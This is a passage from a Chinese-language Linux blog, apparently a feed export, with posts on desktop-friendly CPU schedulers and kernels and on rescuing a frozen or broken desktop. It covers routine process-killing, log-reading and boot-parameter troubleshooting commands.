<h2 id="适合桌面的进程调度"><a href="#适合桌面的进程调度" class="headerlink" title="适合桌面的进程调度"></a>适合桌面的进程调度</h2><p>Linux的一些设计和参数偏向服务器、嵌入式设备等用途，毕竟普通桌面用户的意见加起来都比不上半个红帽。<br>IO调度没关系，反正有个SSD就完全够了，用NOOP调度甚至直接不要IO调度都没关系。<br>进程调度就不太行了，默认的CFS (Completely Fair Scheduler)调度非常不适合日常桌面使用。<br>通常服务器多是I&#x2F;O密集型任务，而桌面（Desktop Enviroment，比如KDE和GNOME这种）需要快速响应（低延迟）和不断切换任务，CFS就不适合了（没法做到不断的切换优先级和抢占）。</p>
<p>比如编译、看视频CPU硬解码、玩游戏，负载高了之后，如果用CFS调度桌面会非常卡，极大影响体验。</p>
<p>好吧这不太符合Unix哲学，你在terminal里面用管道</p>
<p>麻醉师Con Kolivas针对桌面系统做的BFS（后来改名叫MuQSS了）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGludXgtbWFnYXppbmUuY29tL3Zhci9saW51eF9tYWdhemluL3N0b3JhZ2UvaW1hZ2VzL21lZGlhL2xpbnV4LW1hZ2F6aW5lLWVuZy11cy9pbWFnZXMvbmV3cy1pbWFnZXMvY2FydG9vbi1mZWF0dXJlcy8zNjc5MDgtMS1lbmctVVMvQ2FydG9vbi1GZWF0dXJlc19tZWRpdW0ucG5n">https://www.linux-magazine.com/var/linux_magazin/storage/images/media/linux-magazine-eng-us/images/news-images/cartoon-features/367908-1-eng-US/Cartoon-Features_medium.png<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="服务器进程调度"><a href="#服务器进程调度" class="headerlink" title="服务器进程调度"></a>服务器进程调度</h2><p>大多数服务器默认的CFS以及足够合适了。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RlbmNlbnQvVGVuY2VudE9TLWtlcm5lbCMlRTclQTYlQkIlRTclQkElQkYlRTglQjAlODMlRTUlQkElQTYlRTclQUUlOTclRTYlQjMlOTVidA==">https://github.com/Tencent/TencentOS-kernel#离线调度算法bt<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="更改进程调度"><a href="#更改进程调度" class="headerlink" title="更改进程调度"></a>更改进程调度</h2><h3 id="chrt更改调度策略"><a href="#chrt更改调度策略" class="headerlink" title="chrt更改调度策略"></a>chrt更改调度策略</h3><p>使用见<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjgvJUU0JUJEJUJGJUU3JTk0JUE4Y2hydCVFNCVCRiVBRSVFNiU5NCVCOSVFOCVCRiU5QiVFNyVBOCU4QiVFOCVCMCU4MyVFNSVCQSVBNiVFNyVBRCU5NiVFNyU5NSVBNSVFNSU4RiU4QSVFNCVCQyU5OCVFNSU4NSU4OCVFNyVCQSVBNy9pbmRleC5odG1s">使用chrt修改进程调度策略及优先级<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="内核选择"><a href="#内核选择" class="headerlink" title="内核选择"></a>内核选择</h3><p><em>选择非官方支持的内核请谨慎，因为可能有很多不兼容的问题。</em>没有特别需求和强迫症还是推荐使用有官方支持的内核，比如Archlinux官方源支持维护&#96;&#96;linux<code>（没啥特殊偏好就这个呗），</code>linux-lts<code>（lts版，不想天天更新内核就用这个）， </code>linux-zen<code>（跟AMD的zen关系不太大，主要是针对桌面的），</code>linux-harended&#96;（有安全加固，会牺牲一定性能）</p>
<p><code>linux</code>这个包的调度器是CFS，大多数情况下表现都不差。（lts当然也是喽）</p>
<p>如果你是桌面用户，对性能和延迟有需求，可以试试linux-ck、linux-zen、linux-xanmod、linux-tgk等一堆针对桌面和性能优化的内核。<code>linux-ck</code>的调度器是MuQSS。xanmod的调度器可以选cauche。</p>
<p>我个人体验是xanmod内核的延迟最低（直接拯救了我玩空洞骑士时肉眼可见的延迟）。玩OSU音游的喜欢用linux-zen，这个包是官方维护，比较省心，xanmod延迟虽然跑分上比这个低，对延迟要求不苛刻、反应慢的，可能体验不出来太大区别。</p>
<p>（音游在Linux上的声音延迟应该是PulseAudio的锅，但是现在Pipewire又不稳，实际效果还不如PulseAudio,等pipewire稳定下来不知道要多久，只有打点补丁才能维持的了生活的样子。感谢这位玩家给wine-osu打的补丁<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRoZXBvb24uZnIvb3N1TGludXhBdWRpb0xhdGVuY3kv">Low-latency osu! on Linux<i class="fa fa-external-link-alt"></i></span>）<br><em>关于游戏的题外话</em><br>Archlinux可以装gamemode和performance-tweaks（这个在chaotic-aur里面）。</p>
<p>xanmod实测见：<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9YXJ0aWNsZSZpdGVtPXhhbm1vZC1saXF1b3JpeC01MTA=">XanMod’s Linux 5.10 Kernel Helping Tap Extra Performance With The AMD Ryzen 9 5900X<i class="fa fa-external-link-alt"></i></span><br>cuache相关讨论：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5lbmRlYXZvdXJvcy5jb20vdC9pbnRyb2R1Y2luZy10aGUtY2FjdWxlLXNjaGVkdWxlci1hLWNmcy1yZXBsYWNlbWVudC8xMzY0NA==">https://forum.endeavouros.com/t/introducing-the-cacule-scheduler-a-cfs-replacement/13644<i class="fa fa-external-link-alt"></i></span></p>
<p>如果要用btrfs或者cgroups，请注意MuQSS兼容性不太好。</p>
<p>Archlinux直接AUR编译就行了。不过很多人换ck内核是因为老机器性能不好，找一个编译好的源（比如repo-ck）或者在别的机子上编译一个吧。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzcyMDIyNy8=">https://lwn.net/Articles/720227/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cubGludXgtbWFnYXppbmUuY29tL09ubGluZS9OZXdzL0Nvbi1Lb2xpdmFzLUludHJvZHVjZXMtTmV3LUJGUy1TY2hlZHVsZXI=">https://www.linux-magazine.com/Online/News/Con-Kolivas-Introduces-New-BFS-Scheduler<i class="fa fa-external-link-alt"></i></span></p>
<p>为什么Linux CFS调度器没有带来惊艳的碾压效果<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvZzI1MC9hcnRpY2xlL2RldGFpbHMvOTY1MDAxODY=">Linux桌面GUI系统的调度器应该怎么做才不卡顿呢？<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvZzI1MC9hcnRpY2xlL2RldGFpbHMvOTYzNjI3ODk=">为什么Windows&#x2F;iOS操作很流畅而Linux&#x2F;Android却很卡顿呢<i class="fa fa-external-link-alt"></i></span> dog250这位博主在CSDN上从2009年开始，一直在写，文章还不错（不要因为CSDN就不看啊，这是早期良心用户）。这样的稀有博主是我一直没舍得狠下心屏蔽CSDN的原因（颇有一种在垃圾坑里淘宝的感觉）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kcmF2ZW5lc3MubWUvc3lzdGVtLWRlc2lnbi1zY2hlZHVsZXIv">调度系统设计精要 - 面向信仰编程<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2NrLmtvbGl2YXMub3JnLw==">http://ck.kolivas.org/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saXF1b3JpeC5uZXQv">https://liquorix.net/<i class="fa fa-external-link-alt"></i></span> 这个内核是基于zen内核加了一些其他的补丁和改动（有ck补丁，但是没有MuQSS，原因<code>I&#39;m severely prejudiced against MuQSS, so it will continue &quot;giving a null&quot;.</code>, 见这里<span class="exturl" data-url="aHR0cHM6Ly9idWdzLmFyY2hsaW51eC5vcmcvdGFzay81NjMxMiVFRiVCQyU4OQ==">https://bugs.archlinux.org/task/56312）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZW9wbGUuZWNlLnViYy5jYS9zYXNoYS9wYXBlcnMvZXVyb3N5czE2LWZpbmFsMjkucGRm">The Linux Scheduler: a Decade of Wasted Cores<i class="fa fa-external-link-alt"></i></span> 讲多核的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmloeXBvLm5ldC8xNTI3OTU1NzcwOTY4NS5odG1s">https://blog.ihypo.net/15279557709685.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2xpbnV4cGVyZi5jb20vP3A9NDI=">http://linuxperf.com/?p=42<i class="fa fa-external-link-alt"></i></span></p>
<!-- https://blog.csdn.net/XD_hebuters/article/details/79623130

https://cloud.tencent.com/developer/article/1603970

https://cloud.tencent.com/developer/article/1603974 -->

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGVsbG9raXR0eTIvcC8xNDE5OTc0MS5odG1s">https://www.cnblogs.com/hellokitty2/p/14199741.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZWFuYXJraC9yZWFkLWxpbnV4LTAuMTE=">https://github.com/theanarkh/read-linux-0.11<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy53b3dvdGVjaC5uZXQvcHJvY2Vzc19tYW5hZ2VtZW50LzQ0OS5odG1s">http://www.wowotech.net/process_management/449.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTG95ZW5XYW5nL3AvMTI0NTkwMDAuaHRtbA==">Linux进程调度-组调度及带宽控制<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>scheduler</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统的抢救和维护（桌面篇）</title>
    <url>/linux-rescue/</url>
    <content><![CDATA[<p>这篇水文主要是写给桌面玩家看的，如果您的服务器出了问题，请出门右拐。</p>
<span id="more"></span>

<p>由于这篇水文是写给普通玩家的，所以尽量简单易懂、适合萌新操作。所以像eBPF、Systemtap这样的神兵利器几乎不会多讲 （这还是我在《性能之巅》这本书看到作者传教DTrace才了解的，这些东西对于一般路过普通用户大概就像vim和emacs, 很强，但是学习成本太高）<br>这里面有一些systemd的内容，openrc用户请跳过（相信这年头还在坚守openrc和其他非systemd的用户水平应该不用看我博客）。<br>由于本人水平有限，而且这篇写的比较仓促，文中可能有不少错误，光临我博客的大佬们发现了请告诉我。<br>暂时先写这么多，还有很多有意思的、重要的、不好写的没有写，以后再更新。</p>
<h2 id="更新-在群里发送报错信息的方式"><a href="#更新-在群里发送报错信息的方式" class="headerlink" title="更新:在群里发送报错信息的方式"></a>更新:在群里发送报错信息的方式</h2><p>请选择你的截图导师.jpg</p>
<p>不要再贴一大段巨长的报错了，能联网的情况也不要发一张拍的模糊不清的截图了。就算图形界面挂了，在tty环境下只要有网也是可以将报错信息上传到在线剪切板的，比如Ubuntu paste，比如pastebin，比如fars.ee。然后你就可以在另一台机子上搜索报错或者将链接放到群里面问人了（记得阅读提问的智慧）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcitx5-diagnose | curl -F <span class="string">&quot;c=@-&quot;</span> https://fars.ee/</span><br></pre></td></tr></table></figure>

<h2 id="通常的卡死解决流程"><a href="#通常的卡死解决流程" class="headerlink" title="通常的卡死解决流程"></a>通常的卡死解决流程</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol>
<li>此处的“卡死”，指鼠标动不了或某个应用、进程没有响应了</li>
<li>以下流程展示以KDE和Archlinux为例</li>
<li>如果你想问ubuntu内部错误等，那我只能说无可奉告</li>
</ol>
<h3 id="通用流程"><a href="#通用流程" class="headerlink" title="通用流程"></a>通用流程</h3><p>相比于Linux&#x2F;Unix在服务器上几年不关机稳如狗的表现，桌面环境和应用的崩溃和卡死是常事，各种小bug就更多了，毕竟用爱发电的开源拖拉机没那么多人手和资金用在测试和GUI体验上，<strong>要习惯，不要大惊小怪，也不要死机了就一言不合重启重装</strong></p>
<p>虽然KDE、GNOME都有图形化的系统监视器，看起来还不错。然鹅，有点鸡肋：<strong>鼠标经常随着图形界面在x11、wayland罢工后一起没了，键盘几乎能战斗到最后一刻</strong>（除非 kernel panic 或者 usb等外设的kernel module出问题了）。请适应并熟悉终端模拟器、tty、vim等键盘操作。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果能，那问题应该不大，然后用<code>htop</code>、<code>glances</code>之类的东西看一下罪魁祸首是谁。</p>
<p>找到那个进程的pid，试试杀掉它。比如vscode内存泄漏动不了了，那就<code>pkill code</code>(相当于<code>ps -ef | grep vscode | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9</code>)。<br>如果你不知道具体叫什么，但是它在屏幕前能看到，可以用<code>xkill</code>命令终止它（如果你还能动鼠标）</p>
<p>如果程序或应用是systemd守护进程，用systemctl停掉或重启（openrc、crontab、pm2等同理），比如<code>systemctl disable neo4j --now</code>禁用并停止neo4j数据库的daemon；<code>systemctl daemon-reload &amp;&amp; systemctl restart kubelet</code>刷新配置并重启kubelet（咦，好像没有桌面玩家在自己电脑上跑kubelet进程…一时没想起更好的例子）</p>
<p>提供了禁用命令的优先用自带命令，比如禁用KDE自带的文件搜索baloo，<code>balooctl stop &amp;&amp; balooctl disable</code></p>
<p>如果怀疑是KDE桌面及其组件的问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plasmashell --replace</span><br></pre></td></tr></table></figure>

<p>如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kquitapp5 plasmashell &amp;&amp; kstart5 plasmashell</span><br></pre></td></tr></table></figure>

<p>正常退出不行就试试killall</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">killall plasmashell &amp;&amp; kstart5 plasmashell</span><br></pre></td></tr></table></figure>

<p>或者重启一下SDDM</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sddm</span><br></pre></td></tr></table></figure>

<p>还不行就杀掉tty1，然后重启xorg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep tty1 <span class="comment"># 或者pgrep tty1</span></span><br></pre></td></tr></table></figure>

<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启。或者这样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pkill x</span><br><span class="line">startx</span><br></pre></td></tr></table></figure>

<p>那如果你连tty都切不过去，就用魔术键重启。（如果你提前设置开启了魔术键SysRq的话，这个下面再讲）<br>按住<code>Alt+Shift+SysRq</code>，依次按<code>REISUB</code>这几个键。（每按一个键停几秒钟）（如果你内核出了kernel panic之类的问题，那魔术键也没用）</p>
<p>再不行直接<code>reboot</code>，<code>shutdown -r now</code>就好了</p>
<p>以上的命令如果桌面经常卡死建议绑定到你喜爱的快捷键上（在动不了鼠标和快捷键调不出终端模拟器的时候能用上）</p>
<p>再不行就直接尝试长按电源关机了（一般长按电源键5-10秒，这取决于你的主板BIOS设置，这会发送一个<code>RESET</code>信号）。如果你的主板有复位键，就按复位键重启。实在实在没办法那就拔电源吧。（做好丢失所有未保存数据的准备）</p>
<p>ps: 如果你用的ext4，那恭喜你，中奖了。异常掉电可能不是丢失数据这么简单了，你的文件系统可能已经出了小问题。（这个后面再说）</p>
<h3 id="如何终止-重启进程"><a href="#如何终止-重启进程" class="headerlink" title="如何终止&#x2F;重启进程"></a>如何终止&#x2F;重启进程</h3><h4 id="首先找到它"><a href="#首先找到它" class="headerlink" title="首先找到它"></a>首先找到它</h4><p>以vscode为例：<code>ps aux | grep vscode</code>或<code>pgrep -fl vscode</code>（<code>-f</code>参数表示<code>use full process name to match</code>，如果不加<code>-f</code>是找不到vscode的，只有<code>grep code</code>能找到进程（因为这个进程名字叫code））</p>
<p><img src="/linux-rescue/1618143574.png"></p>
<p>如果不想让<code>ps aux | grep xx</code>的时候每次都显示他自己，再加上<code>|grep -v &quot;grep&quot;</code><br>如果能在屏幕上看到它就直接<code>xkill</code></p>
<h4 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h4><p>kill的方式大概有这些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS</span><br></pre></td></tr></table></figure>

<p>比较常用的有HUP(通常在关闭终端模拟器的时候，调用SIGHUP，可以用<code>nohup</code>等命令让终端模拟器关闭后进程继续)、QUIT（退出，调用SIGQUIT，<code>Ctrl+\</code>）、KILL（调用SIGKILL，使用<code>kill -9 就是这个</code>）。此外还有TERM（软中断），开发板常用，桌面用户可能用的不多。 </p>
<p><code>Ctrl+z</code>调用的就是SIGTSTP，这是最温和的一种，挂起的进程可以用<code>fg</code>恢复;<code>Ctrl+c</code>调用的就是SIGINT，会终止进程。</p>
<p>这部分内容可以去阅读《UNIX高级编程》等书，或者看看维基词条<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5peCVFNCVCRiVBMSVFNSU4RiVCNw==">Unix信号<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="碰到比较严重情况的抢救"><a href="#碰到比较严重情况的抢救" class="headerlink" title="碰到比较严重情况的抢救"></a>碰到比较严重情况的抢救</h2><p>这种情况包括但不限于不小心卸载了系统自带的python、卸载了iptables、卸载了桌面环境（DE）或者卸载了什么重要的库，或者你改了什么<code>kernel parameter</code>直接黑屏进不去了，又或者你执行了危险的<code>dd</code>命令。</p>
<p>有或者显卡驱动有问题了</p>
<p>或者双系统Windows更新把你grub整没了（不要双系统就没这么多事，直接上<code>systemd-boot</code>之类的东西）</p>
<p>反正，开机直接黑屏了。或者你运气好，能进grub界面，还能抢救一下。或者运气更好，进了grub界面然后在DM那里黑屏了（这种可能是显卡驱动的问题）</p>
<p>你可能需要一个LiveUSB用来抢救。如果你没设置加密，那就挂载<code>\</code>, <code>\home</code>, <code>\boot</code>等目录然后chroot进去修。</p>
<p>试试重装重要的包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S base base-devel linux linux-firmware linux-headers xorg plasma kde-applications</span><br></pre></td></tr></table></figure>

<h3 id="文件系统损坏"><a href="#文件系统损坏" class="headerlink" title="文件系统损坏"></a>文件系统损坏</h3><p>比如，ext4断电。</p>
<p>如果你的电脑要经常面对断电等恶劣情况，那建议去用ZFS等文件系统，不要用ext4</p>
<h3 id="kernel-panic-等"><a href="#kernel-panic-等" class="headerlink" title="kernel panic 等"></a>kernel panic 等</h3><p>Kernel panic之类的问题通常比较严重</p>
<p>kernel panic segmentation fault core dump</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0NvcmVfZHVtcCNFeGFtaW5pbmdfYV9jb3JlX2R1bXA=">https://wiki.archlinux.org/index.php/Core_dump#Examining_a_core_dump<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="看看是不是硬件坏了"><a href="#看看是不是硬件坏了" class="headerlink" title="看看是不是硬件坏了"></a>看看是不是硬件坏了</h3><p>内存条没插紧、硬盘坏了、电源没插好、主板受潮了。。。。</p>
<h2 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h2><p>排查问题和调试比较需要经验，而且要花费不少时间。调试并修好，很有可能比直接重装所花费的时间、精力多得多。<strong>如果你赶时间，我建议做好备份，随时重装。不要将有限的时间浪费在排查问题上。</strong></p>
<!-- 
![do you have a life?](/linux-rescue/1618281436.png)

图源[reddit u/sovietarmyfan](https://www.reddit.com/r/linuxmemes/comments/ejdkaj/choosing_an_os_my_own_version/)
 -->

<p><strong>但是，追根溯源找到问题并修好它，很有意思，不是吗？</strong></p>
<p>网上充斥着性能优化的教程，好多都盗了下面这张图，不仅不标注<span class="exturl" data-url="aHR0cDovL3d3dy5icmVuZGFuZ3JlZ2cuY29tL2Jsb2cvMjAxOS0wNy0xNS9icGYtcGVyZm9ybWFuY2UtdG9vbHMtYm9vay5odG1s">来源<i class="fa fa-external-link-alt"></i></span>还把右下角来源抹去（而且还是17年版的老图传来传去）<br><img src="/linux-rescue/1618031552.png"><br>本来想仿照这个做一个调试的图，但是想到指不定又被盗了。算了，随便写点大家将就着看吧。</p>
<h3 id="查看报错和日志"><a href="#查看报错和日志" class="headerlink" title="查看报错和日志"></a>查看报错和日志</h3><p>遇到解决不了的问题先把报错和版本信息记下来，然后去谷歌一下，搜不到的就去拿着详细的报错去相应的地方请教大佬（希望您提问之前已经阅读了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5oYW53dS9Ib3ctVG8tQXNrLVF1ZXN0aW9ucy1UaGUtU21hcnQtV2F5L2JsbyUyMGIvbWFpbi9SRUFETUUtemhfQ04ubWQ=">《提问的智慧》<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9jb29sc2hlbGwuY24vYXJ0aWNsZXMvMTA4MDQuaHRtbA==">X-Y Problem<i class="fa fa-external-link-alt"></i></span>等）</p>
<h4 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h4><p>进入急救模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl rescue</span><br><span class="line">systemctl emergency</span><br></pre></td></tr></table></figure>

<p>查看systemd日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">journalctl -x</span><br><span class="line">journalctl -k <span class="comment"># 查看内核日志</span></span><br><span class="line">journalctl -b <span class="comment"># 查看从启动以来的日志</span></span><br><span class="line">journalctl -b -1 <span class="comment"># 上次启动的日志</span></span><br></pre></td></tr></table></figure>

<p>查看某个守护进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status NetworkManager</span><br><span class="line">journalctl -u unit</span><br></pre></td></tr></table></figure>



<h4 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h4><p>fcitx5的诊断</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcitx5-diagnose</span><br></pre></td></tr></table></figure>

<h4 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h4><p><code>cmd-shift-p</code> -&gt; Search <code>Show Logs</code> -&gt; <code>Extension Host</code></p>
<h3 id="如何调试内核"><a href="#如何调试内核" class="headerlink" title="如何调试内核"></a>如何调试内核</h3><p>用户态的问题都还比较好调试，总不至于崩了连个报错信息和崩溃日志都保存不下来。内核相关的问题比较麻烦，不过好在除非自己各种折腾或者用Arch这种内核经常滚动升级的，一般碰不到这些问题。</p>
<p>我调试内核的经验也不多，为数不多的几次几乎都是当年在开发板上。sniper写得那个《Linux内核调试指南》写得挺好，然而不太适合普通的桌面玩家，而且有一点年头了。gdb调试，printk在桌面发型版kernel panic的时候几乎都失效了。对于普通的桌面玩家，遇到了 kernel panic 等严重问题，发现自己解决不了，不妨去论坛&#x2F;群里提问，找有空的大佬帮你看看（有些小白尝试debug的时候可能越折腾问题越严重）。桌面玩家检查一下自己最近干了什么或者最近系统更新了什么应该就能找到问题了。</p>
<p>常见的调试方式包括：</p>
<ol>
<li>Kdump+crash</li>
<li>Serial Console</li>
</ol>
<p>用kdump捕获错误（kdump会在内核崩溃的时候用kexec运行捕获内核然后转储），然后用crash看一下。使用之前Kdump你可能需要自己编译内核，在内核参数里面设置参数，然后还要设置systemd守护进程。<br>ArchLinux玩家可以参考ArchWiki的<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0tkdW1w">Kump<i class="fa fa-external-link-alt"></i></span>条目设置（Archlinux默认没装需要的包，Wiki也没说，要装一下<code>sudo pacman -S kexec-tools crash</code>。）</p>
<p>Serial Console 串口调试这个折腾过嵌入式的应该也很熟悉了，需要在bootloader设置一下。<br>Arch用户也可以参照ArchWiki词条<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1dvcmtpbmdfd2l0aF90aGVfc2VyaWFsX2NvbnNvbGU=">Working with the serial console<i class="fa fa-external-link-alt"></i></span>设置（我只在树莓派上的archarm试过串口，并没有用这种方法调试过内核）<br>大部分桌面用户的笔记本和台式机上可能已经没有串口了（仅存不多的可能也就给个针脚），搞一个USB转串口才能愉快的调试。</p>
<p>一般桌面用户出现内核问题用journalctl看一下日至或者拍一下屏幕上的错误然后到群里&#x2F;论坛请教就行了。见：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0dlbmVyYWxfdHJvdWJsZXNob290aW5nXyglRTclQUUlODAlRTQlQkQlOTMlRTQlQjglQUQlRTYlOTYlODcpIyVFNSU4NiU4NSVFNiVBMCVCOCVFNSVCNCVBOSVFNiVCQSU4M18oS2VybmVsX3Bhbmljcyk=">ArchWiki: General_troubleshooting_(简体中文)#内核崩溃_(Kernel_panics)<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>Go mod 命名导致的问题：<span class="exturl" data-url="aHR0cHM6Ly94dWFud28uaW8vMjAyMC8xNC1idWctaW50cm9kdWNlZC1ieS1iaW5hcnktbmFtZS8=">记一次二进制乱起名字引发的翻车<i class="fa fa-external-link-alt"></i></span></p>
<p>我几个月前被和漩涡这个翻车一模一样的问题坑了。</p>
<h3 id="调试驱动问题"><a href="#调试驱动问题" class="headerlink" title="调试驱动问题"></a>调试驱动问题</h3><p>驱动这个我单独讲一下。因为网上搜“驱动调试”都是嵌入式开发（几年前我）需要的（会叫你用strace、gdb、printk）,对于桌面用户（现在的我）应该去搜关键词：“型号+Linux”。不过如果你不用螃蟹网卡、Nvidia双显卡、某些阴间网卡、不支持Linux的BIOS，应该不用担心。用的XPS、Thinkpad系列等对Linux支持比较好的笔记本应该也不用担心。</p>
<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><p>我用一个PS\2键盘(P口键盘)为例演示一下:</p>
<p>OS：Archlinux<br>主板：b85<br>Kernel：Linux-lts 5.10<br>CPU：intel i5-4590<br>键盘：PS2口的老键盘<br>症状：PS\2键盘插上去用不了</p>
<ol>
<li>首先用<code>dmesg</code>等工具检查一下，没啥问题。然后重启（PS\2不支持热插拔，保险期间重启试试）</li>
<li>除了通用驱动会被合并到kernel主线，大部分驱动是<code>kernel module</code>的形式。所以我们先<code>lsmod</code>看一下有没有PS\2相关的东西。只找到了<code>psmouse</code>（先假装不知道i8042是干嘛的）</li>
<li>然后去找相关的驱动呗。搜一下“PS\2键盘 驱动”，搜出来第一条是微软的文档，不过没关系，它告诉我们是i8042了。再<code>lsmod</code>看一下，它有。再<code>modprobe i8042</code>看一下，也是好的。</li>
<li>再搜一下启动参数就发现PS\2和atkbd这个模块有关，然后就顺手搜到这个：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Y24ub3JnL2xpbnV4LTMxMy13YXJuaW5nLXBzMi1rZXlib2FyZC1zdXBwb3J0LWlzLW5vdy1tb2R1bGFyLw==">Linux 3.13 警告：PS&#x2F;2 键盘支持现已模块化<i class="fa fa-external-link-alt"></i></span>。</li>
<li>然而高兴早了，还是不行, 但是搜到了一个和我一样的<span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8zNTQ4MDIvcHMtMi1rZXlib2FyZC1vbmx5LXdvcmtzLXVwLXRvLWdydWItbm90LWFmdGVyLW9zLWZ1bGx5LWJvb3RlZD9ub3JlZGlyZWN0PTEmbHE9MQ==">PS&#x2F;2 keyboard only works up to GRUB, not after OS fully booted<i class="fa fa-external-link-alt"></i></span> 没有得到解决</li>
<li>这个问题没有解决，但是有上面那个提问告诉我一个重要的信息：直到GRUB都还是工作的（works up to GRUB）。于是我在GRUB界面试了试，上下和回车都能用、NumLock也是亮的。</li>
<li>那就简单了，是GRUB启动参数哪里有问题喽。搜索“GRUB i8042”发现很多触控板的问题（touchpad），GRUB加上启动参数<code>i8042.reset i8042.nomux i8042.nopnp i8042.noloop</code>问题立刻解决了</li>
<li>还看到下面<span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8yODczNi93aGF0LWRvZXMtdGhlLWk4MDQyLW5vbXV4LTEta2VybmVsLW9wdGlvbi1kby1kdXJpbmctYm9vdGluZy1vZi11YnVudHU=">这个链接<i class="fa fa-external-link-alt"></i></span>回答为什么添加<code>i8042.nomux</code>参数能解决触控板的问题（自动检测是否多工（Multiplexing）的默认配置有问题，改成禁用就好了）。</li>
